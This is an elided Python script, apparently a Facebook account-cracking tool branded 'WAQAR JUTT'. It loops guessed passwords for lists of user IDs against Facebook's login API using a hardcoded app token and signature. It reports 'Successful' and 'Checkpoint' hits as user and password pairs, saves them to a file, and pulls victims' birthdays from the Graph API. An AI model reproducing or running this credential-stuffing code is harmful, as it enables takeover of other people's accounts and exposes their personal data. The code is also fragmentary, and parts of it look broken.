...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		...
		#WAQAR_JUTT('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		...
		try:
			...
			self.id = WAQAR(self.apk).read().splitlines()

			WAQAR_JUTT(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							WAQAR_JUTT('[•] Result CP saved to CP.txt')
					...
					WAQAR_JUTT('02.) Metode mbasic ')

					WAQAR_JUTT('03.) Metode Mobile ')
			...
			WAQAR_JUTT(' [1] AKING Method 1 ')

			WAQAR_JUTT(' [2] AKING Method 2  [ Pro ]')

			WAQAR_JUTT(' [3] AKING Method 3   ')
	...
	def __api__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;97m [JUTT] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			try:
				...
				ua_xiaomi = WAQAR('agent.txt', 'r').read()

			except (KeyError, IOError):

				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

			p = Prof_WAQAR("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()

			if "access_token" in p:

				WAQAR_JUTT('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					token = WAQAR('login.txt').read()

					cp_ttl = Prof_waqar('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']

					month, day, year = cp_ttl.split('/')

					month = bulan_ttl[month]

					WAQAR_JUTT('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
				...
				WAQAR_JUTT('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				WAQAR_JUTT('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
				...
				try:
					...
					token = WAQAR('token.txt').read()

					cp_ttl = Prof_waqar('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']

					month, day, year = cp_ttl.split('/')

					month = bulan_ttl[month].WAQAR_JUTT('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
WAQAR   JUTT
 ...
 [*]=============================================
    ...
    Facebook : https://www.facebook.com/profile.php?id=100035235171944
